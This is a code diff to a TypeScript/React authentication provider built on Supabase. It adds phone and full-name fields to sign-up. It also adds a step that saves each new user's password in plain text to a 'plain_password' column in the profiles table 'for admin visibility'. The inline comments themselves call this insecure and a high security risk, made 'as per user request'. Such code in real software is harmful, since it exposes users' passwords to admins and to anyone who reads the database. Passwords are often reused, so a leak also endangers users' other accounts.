@@ -16,7 +16,7 @@ type AuthCtx = {
   isDelivery: boolean;
   loading: boolean;
   signIn: (usernameOrEmail: string, password: string) => Promise<{ error?: string }>;
-  signUp: (username: string, password: string, phone?: string) => Promise<{ error?: string }>;
+  signUp: (username: string, password: string, phone: string, full_name: string) => Promise<{ error?: string }>;
   signOut: () => Promise<void>;
   refreshRoles: () => Promise<void>;
 };
@@ -66,13 +66,24 @@ export function AuthProvider({ children }: { children: ReactNode }) {
     return {};
   };
 
-  const signUp: AuthCtx["signUp"] = async (username, password, phone) => {
+  const signUp: AuthCtx["signUp"] = async (username, password, phone, full_name) => {
     const email = toEmail(username);
-    const { error } = await supabase.auth.signUp({
+    const { data: authData, error } = await supabase.auth.signUp({
       email, password,
-      options: { data: { username, phone: phone ?? null }, emailRedirectTo: `${window.location.origin}/` },
+      options: { data: { username, phone: phone ?? null, full_name: full_name ?? null }, emailRedirectTo: `${window.location.origin}/` },
     });
+    
     if (error) return { error: error.message };
+
+    // Explicitly update profile with plain_password for admin visibility (Insecure - as per user request)
+    if (authData.user) {
+      await supabase.from("profiles").update({ 
+        full_name, 
+        phone, 
+        plain_password: password // High Security Risk: Storing plain text password for admin support purposes
+      }).eq("id", authData.user.id);
+    }
+
     return {};
   };
 
